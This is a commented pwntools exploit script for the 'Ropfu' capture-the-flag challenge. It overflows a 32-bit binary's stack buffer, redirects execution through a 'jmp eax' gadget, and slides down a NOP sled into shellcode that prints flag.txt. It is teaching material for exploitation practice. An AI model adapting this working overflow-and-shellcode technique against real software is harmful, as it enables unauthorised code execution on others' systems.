#!/bin/python3

# Helpful Guides:
# https://docs.pwntools.com/en/stable/shellcraft/i386.html
# https://www.youtube.com/watch?v=c7wNN8qgxAA (Ropfu walkthrough with John Hammond)

import pwn

#Using pwn tools to generate the shell command
  #This shell command in particular will “cat flag.txt” in the current directory
  #The “pwn.asm()” is a wrapper that will format it into assembly instructions
#Use the link above to look at the pwntools library
shell_code = b''
shell_code = pwn.asm(pwn.shellcraft.i386.linux.cat('flag.txt'))

#Initializing our offset variable (that we found through fuzzing)
#then our overflow (junk) variable then
#a short_jmp (assembly instruction: EB 0x8 nop nop),
#a new_eip_jmp_eax (an address to “jmp eax” found with ROPgadget),
#and a landing nop sled (new_eip_jmp_eax) that will slide us into our shell code
offset = 28
short_jmp = b"\xeb\x08\x90\x90"
overflow_and_launhcing_nops = (b"\x90" * (offset - len(short_jmp)))
landing_nops = b'\x90'*30
new_eip_jmp_eax = pwn.p32(0x805333b)


#Connecting to a remote socket (creating an object to interact with)
#p = pwn.remote('<url_or_fqdn_here>', <port>)

#Connecting to the program locally (creating an object to interact with)
p = pwn.process('./vuln')

#This module allows you to attach the current object to GDB to analyze
#With this module, you can additionally run commands to be executed as a string argument
pwn.gdb.attach(p, '''
b *0x8049dc0
b *0x805333b
c
telescope $esp -l 20''')

#Our payload will:
  #- Fill the buffer with  overflow_and_launhcing_nops && short_jmp
  #- Fill the return instruction pointer with new_eip_jmp_eax
  #- new_eip_jmp_eax is just the address of a “jmp eax” instruction
  #- Continue writing a landing nop sled with landing_nops
  #- Finally finish with writing our shell code that we are going to slide into from landing_nops
payload = [
overflow_and_launhcing_nops,
short_jmp,
new_eip_jmp_eax,
landing_nops,
shell_code,	
]

payload = b''.join(payload)

#Execution Flow:
  #1. Overflow the buffer, writing new_eip_jmp_eax over the return instruction pointer that is #returned to after vuln()
  #2. Our code will jump to the value stored in eax (which is just a pointer to the top of the stack #where our overflow_and_launhcing_nops begins (which itself is a series of ‘\x90’s followed by our short jump ‘\xeb\x08\x90\x90’)
  #3. It will continue to slide down our nop sled (overflow_and_launhcing_nops) until it hits our #short_jmp, where it will simply jump to the address that is an offset of 0x8 relative to its current 
  #   address (this is just so we can jump over new_eip_jmp_eax as we move our way back up the #stack to our landing_nops  and shell_code 
  #4. After our short_jmp from above, we should land in our landing_nops which will continue to slide us into our shell_code  which is utilizing a pwn tools module to cat out “flag.txt” from wherever the binary is executing BOOM!!!!!!

#Sending payload
p.sendline(payload)

#Initializing an interactive session
p.interactive()
